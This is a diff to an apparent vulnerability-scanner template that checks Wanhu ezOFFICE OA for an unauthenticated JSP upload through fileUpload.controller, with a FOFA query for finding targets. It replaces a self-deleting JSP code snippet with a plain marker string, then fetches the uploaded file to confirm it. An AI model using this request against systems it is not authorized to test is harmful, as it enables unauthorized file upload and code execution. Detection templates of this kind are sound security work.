@@ -1,11 +1,13 @@
 id: wanhu-oa-fileupload-controller-upload
 
 info:
-  name: 万户 OA Upload RCE
+  name: 万户 OA fileupload.controller 文件上传漏洞
   author: unknown
   severity: critical
   description: |
     fofa: app="万户网络-ezOFFICE"
+  tags: wanhu,oa,fileupload
+  created: 2024/07/16
 
 set:
   rfilename: randomLowercase(4)
@@ -20,9 +22,9 @@ rules:
       path: /defaultroot/upload/fileUpload.controller
       headers:
         Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
-      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{rfilename}}.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.print(\"{{md5str}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--WebKitFormBoundary{{rboundary}}--\r\n\r\n"
+      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{rfilename}}.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n{{md5str}}\r\n--WebKitFormBoundary{{rboundary}}--\r\n\r\n"
     expression: response.status == 200 && response.body.bcontains(b'success')
-    output: 
+    output:
       search: r'"data":"(?P<filename>\d+).jsp"'.bsubmatch(response.body)
       uploadfilename: search['filename']
   r1:
@@ -30,4 +32,4 @@ rules:
       method: GET
       path: /defaultroot/upload/html/{{uploadfilename}}.jsp
     expression: response.status == 200 && response.body.bcontains(bytes(md5str))
-expression: r0() && r1() 
+expression: r0() && r1()
